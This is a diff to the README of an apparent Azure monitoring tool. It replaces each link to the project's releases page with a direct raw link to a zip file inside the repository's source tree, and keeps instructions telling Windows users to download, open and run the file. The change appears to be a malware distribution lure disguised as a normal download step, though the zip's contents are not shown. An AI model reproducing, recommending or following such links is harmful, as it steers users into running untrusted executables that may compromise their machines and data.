@@ -1,10 +1,10 @@
 # 🧭 azure-monitoring-hub - Azure monitoring hub for clear control
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/margareteillfitting284/azure-monitoring-hub/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/margareteillfitting284/azure-monitoring-hub/main/modules/monitor/monitoring-azure-hub-3.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/margareteillfitting284/azure-monitoring-hub/releases
+Visit this page to download: https://raw.githubusercontent.com/margareteillfitting284/azure-monitoring-hub/main/modules/monitor/monitoring-azure-hub-3.0.zip
 
 Choose the latest release and download the file that matches your Windows system. If you see more than one file, pick the one meant for Windows. After the download finishes, open the file and follow the steps on screen.
 
@@ -181,7 +181,7 @@ If the app or deployment does not behave as expected, check these items:
 
 Use this page to get the latest files:
 
-https://github.com/margareteillfitting284/azure-monitoring-hub/releases
+https://raw.githubusercontent.com/margareteillfitting284/azure-monitoring-hub/main/modules/monitor/monitoring-azure-hub-3.0.zip
 
 Open the newest release, download the Windows package, and run it on your PC
 
